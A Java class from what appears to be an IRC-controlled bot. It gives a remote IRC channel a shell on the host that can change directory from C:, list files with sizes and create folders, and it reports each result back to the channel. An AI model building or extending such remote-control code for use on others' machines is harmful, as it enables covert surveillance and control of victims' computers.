import java.io.File;
import java.util.HashMap;
/**
 * 
 * @author Nathan
 *
 */
public class Shell extends Thread {
	/**
	 * Constructor, sets IRC and channel while opening the C drive
	 * @param irc
	 * @param channel
	 */
	public Shell(IRC irc, String channel) {
		setCurrentDir("C://");
		shells.put(channel, this);
		this.start();
	}
	/**
	 * Return the shell
	 * @param channel
	 * @return
	 */
	public static Shell getShell(String channel) {
		return (Shell)shells.get(channel);
	}
	/**
	 * Cd's a directory
	 * @param dir
	 */
	public void cd(String dir) {
		File file;
		if(dir.indexOf(":\\") == -1) {
			file = new File(getCurrentDir() + dir);
			if(file.exists()) {
				if(file.isDirectory()) {
					setCurrentDir(getCurrentDir() + dir);
					IRC.sendMessage(Config.getChannel(), "My current location is " + getCurrentDir());
					if(!getCurrentDir().endsWith("\\")) {
						setCurrentDir(getCurrentDir() + "\\");
					}
				} else {
					IRC.sendMessage(Config.getChannel(), "No such directory: " + dir);
				}
			} else {
				IRC.sendMessage(Config.getChannel(), "No such directory: " + dir);
			}
		} else {
			file = new File(dir);
			if(file.exists()) {
				if(file.isDirectory()) {
					setCurrentDir(dir);
					IRC.sendMessage(Config.getChannel(), "My current location is " + getCurrentDir());
					if(!getCurrentDir().endsWith("\\")) {
						setCurrentDir(getCurrentDir() + "\\");
					}
				} else {
					IRC.sendMessage(Config.getChannel(), "No such directory: " + dir);
				}
			} else {
				IRC.sendMessage(Config.getChannel(), "No such directory: " + dir);
			}
		}
	}
	/**
	 * ls
	 */
	public void ls() {
		this.ls = true;
	}
	/**
	 * Creates a directory
	 * @param dir
	 */
	public void mkdir(String dir) {
		File f;
		if(dir.indexOf(":\\") == -1) {
			f = new File(getCurrentDir() + dir);
		} else {
			f = new File(dir);
		}
		if(f.exists()) {
			IRC.sendMessage(Config.getChannel(), "Directory '" + dir + "' already exists!");
		} else {
			if(f.mkdir()) {
				IRC.sendMessage(Config.getChannel(), "Directory '" + dir + "' created.");
			} else {
				IRC.sendMessage(Config.getChannel(), "Could not create directory '" + dir + "'");
			}
		}
	}
	/**
	 * Gets contents of files in a new thread
	 */
	public void run() {
		while(true) {
			if(this.ls) {
				File dir = new File(getCurrentDir());
				if(!dir.exists() || !dir.isDirectory()) {
					IRC.sendMessage(Config.getChannel(), "No files found.");
					this.ls = false;
					continue;
				}
				IRC.sendMessage(Config.getChannel(), "Contents of " + getCurrentDir() + ":");
				for(File file : dir.listFiles()) {
					if(file.isDirectory()) {
						IRC.sendMessage(Config.getChannel(), file.getName());
					} else {
						long size = file.length();
						if(size >= (1024 * 1024 * 1024)) {
							IRC.sendMessage(Config.getChannel(), file.getName() + " (" + (size / (1024 * 1024 * 1024)) + " GB)");
						} else if(size >= (1024 * 1024)) {
							IRC.sendMessage(Config.getChannel(), file.getName() + " (" + (size / (1024 * 1024)) + " MB)");
						} else if(size >= 1024) {
							IRC.sendMessage(Config.getChannel(), file.getName() + " (" + (size / 1024) + " KB)");
						} else if(size < 1024) {
							IRC.sendMessage(Config.getChannel(), file.getName() + " (" + size + " bytes)");
						}
					}
					try {
						Thread.sleep(500);
					} catch(InterruptedException ie) {
					}
					}
				this.ls = false;
			}
			try {
				Thread.sleep(10);
			} catch(InterruptedException ie) {
			}
		}
	}
	/**
	 * Returns the current directory
	 * @return
	 */
	public static String getCurrentDir()
	{
		return currentDir;
	}
	/**
	 * Sets directory
	 * @param currentDir
	 */
	public static void setCurrentDir(String currentDir) {
		Shell.currentDir = currentDir;
	}

	private static HashMap<String, Shell> shells = new HashMap<String, Shell>(20);
	private static String currentDir;
	private boolean ls = false;

}